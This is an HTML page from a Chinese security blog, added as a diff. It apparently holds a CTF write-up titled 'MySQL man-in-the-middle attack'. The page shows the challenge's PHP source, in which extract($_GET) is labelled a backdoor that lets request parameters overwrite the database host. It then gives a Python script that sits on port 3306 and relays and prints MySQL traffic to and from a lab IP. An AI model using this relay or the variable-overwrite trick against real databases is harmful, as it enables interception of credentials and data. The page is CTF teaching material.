@@ -1,0 +1,376 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>mysql中间人攻击 | FreeV&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="FreeV">
+    
+    <meta name="description" itemprop="description" content="mysql中间人攻击">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="FreeV&#39;s Blog" title="FreeV&#39;s Blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="FreeV&#39;s Blog">FreeV&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:www.freev.cc">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/07/12/mysql中间人攻击/" title="mysql中间人攻击" itemprop="url">mysql中间人攻击</a>
+  </h1>
+  
+  <p class="article-author">By
+    
+      <a href="http://www.freev.cc" title="FreeV">FreeV</a>
+    </p>
+		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span id="busuanzi_container_page_pv">
+			本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+  <p class="article-time">
+    <time datetime="2017-07-12T06:42:58.000Z" itemprop="datePublished">2017-07-12</time>
+    更新日期:<time datetime="2017-07-12T06:52:06.068Z" itemprop="dateModified">2017-07-12</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<h2 id="0x00__u6E90_u7801"><a href="#0x00__u6E90_u7801" class="headerlink" title="0x00 源码"></a>0x00 源码</h2><p></p><h3>这是一道ctf题源码如下：</h3><br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">'view-source'</span>])) &#123;</span><br><span class="line">        show_source(__FILE_<span class="number">_</span>);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="string">"./inc.php"</span>); // key &amp; database config</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">function</span> err(<span class="variable">$str</span>)&#123; die(<span class="string">"&lt;script&gt;alert(\"</span><span class="variable">$str</span>\<span class="string">");window.location.href='./';&lt;/script&gt;"</span>); &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nonce</span> = mt_rand();</span><br><span class="line"> </span><br><span class="line">    extract($_GET); // this is my backdoor</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line"> </span><br><span class="line">        err(<span class="string">"Parameter Missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'key'</span>] !== <span class="variable">$key</span>) &#123;</span><br><span class="line">        err(<span class="string">"You Are Not Authorized!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$conn</span> = mysql_connect(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">        err(<span class="string">"Database Error, Please Contact with GameMaster!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$query</span> = isset($_POST[<span class="string">'query'</span>]) ? bin2hex($_POST[<span class="string">'query'</span>]) : <span class="string">"SELECT flag FROM forward.flag"</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="variable">$res</span>) &#123;</span><br><span class="line">        err(<span class="string">"Database Error, Please Contact with GameMaster!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$res</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$debug</span>) &#123;</span><br><span class="line">        echo <span class="string">"HOST:\t&#123;$host&#125;&lt;br/&gt;"</span>;</span><br><span class="line">        echo <span class="string">"USER:\t&#123;$user&#125;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    echo <span class="string">"&lt;del&gt;FLAG:\t0ctf&#123;&lt;/del&gt;"</span> . sha1(<span class="variable">$nonce</span> . md5(<span class="variable">$row</span>[<span class="string">'flag'</span>])) . <span class="string">"&lt;del&gt;&#125;&lt;/del&gt;&lt;br/&gt;"</span>; // not real flag</span><br><span class="line"> </span><br><span class="line">    mysql_close(<span class="variable">$conn</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p>
+<p></p><h3>这是一个mysql中间人攻击得脚本</h3><p></p>
+<h2 id="0x01__u5229_u7528_u4EE3_u7801_u5982_u4E0B"><a href="#0x01__u5229_u7528_u4EE3_u7801_u5982_u4E0B" class="headerlink" title="0x01 利用代码如下"></a>0x01 利用代码如下</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import <span class="keyword">socket</span></span><br><span class="line">import <span class="keyword">time</span></span><br><span class="line">HOST = <span class="string">'0.0.0.0'</span>                 </span><br><span class="line">PORT = <span class="number">3306</span>              </span><br><span class="line"><span class="keyword">s</span> = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET, <span class="keyword">socket</span>.SOCK_STREAM)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">bind</span>((HOST, PORT))</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">listen</span>(<span class="number">1</span>)</span><br><span class="line">c = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET, <span class="keyword">socket</span>.SOCK_STREAM)</span><br><span class="line">c.<span class="keyword">connect</span>((<span class="string">'192.168.80.131'</span>, <span class="number">3306</span>))</span><br><span class="line">c.<span class="keyword">setsockopt</span>(<span class="keyword">socket</span>.SOL_SOCKET, <span class="keyword">socket</span>.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># data = c.recv(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line"></span><br><span class="line">conn, addr = <span class="keyword">s</span>.<span class="keyword">accept</span>()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Connected by'</span>, addr</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data=c.<span class="keyword">recv</span>(<span class="number">20480</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    conn.sendall(data)</span><br><span class="line">    data=conn.<span class="keyword">recv</span>(<span class="number">20480</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    c.<span class="keyword">send</span>(data)</span><br><span class="line">    <span class="comment"># time.sleep(3)</span></span><br><span class="line">conn.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://www.freev.cc/2017/07/12/mysql中间人攻击/" data-title="mysql中间人攻击 | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2017/06/27/某ctf注入bypass/"  title="某ctf注入bypass">
+ <strong>NEXT:</strong><br/> 
+ <span>某ctf注入bypass
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00__u6E90_u7801"><span class="toc-number">1.</span> <span class="toc-text">0x00 源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.1.</span> <span class="toc-text">这是一道ctf题源码如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#undefined"><span class="toc-number">1.2.</span> <span class="toc-text">这是一个mysql中间人攻击得脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01__u5229_u7528_u4EE3_u7801_u5982_u4E0B"><span class="toc-number">2.</span> <span class="toc-text">0x01 利用代码如下</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+		
+			<li><a href="/tags/php代码安全/" title="php代码安全">php代码安全<sup>1</sup></a></li>
+		
+			<li><a href="/tags/python/" title="python">python<sup>2</sup></a></li>
+		
+			<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>2</sup></a></li>
+		
+			<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>3</sup></a></li>
+		
+			<li><a href="/tags/信息收集/" title="信息收集">信息收集<sup>1</sup></a></li>
+		
+			<li><a href="/tags/加密解密/" title="加密解密">加密解密<sup>1</sup></a></li>
+		
+			<li><a href="/tags/渗透技巧/" title="渗透技巧">渗透技巧<sup>4</sup></a></li>
+		
+			<li><a href="/tags/社会工程学/" title="社会工程学">社会工程学<sup>1</sup></a></li>
+		
+			<li><a href="/tags/隐写/" title="隐写">隐写<sup>3</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+  <div class="tagcloudlist">
+    <p class="asidetitle">标签云</p>
+    <div class="tagcloudlist clearfix">
+       <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/php代码安全/" style="font-size: 10px;">php代码安全</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/sql注入/" style="font-size: 13.33px;">sql注入</a> <a href="/tags/代码审计/" style="font-size: 16.67px;">代码审计</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/加密解密/" style="font-size: 10px;">加密解密</a> <a href="/tags/渗透技巧/" style="font-size: 20px;">渗透技巧</a> <a href="/tags/社会工程学/" style="font-size: 10px;">社会工程学</a> <a href="/tags/隐写/" style="font-size: 16.67px;">隐写</a>
+    </div>
+  </div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+      <li><a href="http://yangjian.me" target="_blank" title="YangJian"></a></li>
+      <li><a href="http://hexo.io" target="_blank" title="Hexo"></a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="null" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2017 
+		
+		<a href="http://www.freev.cc" target="_blank" title="FreeV">FreeV</a>
+		
+		<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+	</span>
+		</p>
+</div>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<link href="http://cdn.bootcss.com/highlight.js/8.0/styles/monokai_sublime.min.css" rel="stylesheet">  
+<script src="http://cdn.bootcss.com/highlight.js/8.0/highlight.min.js"></script>  
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"freev"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+  </body>
+</html>
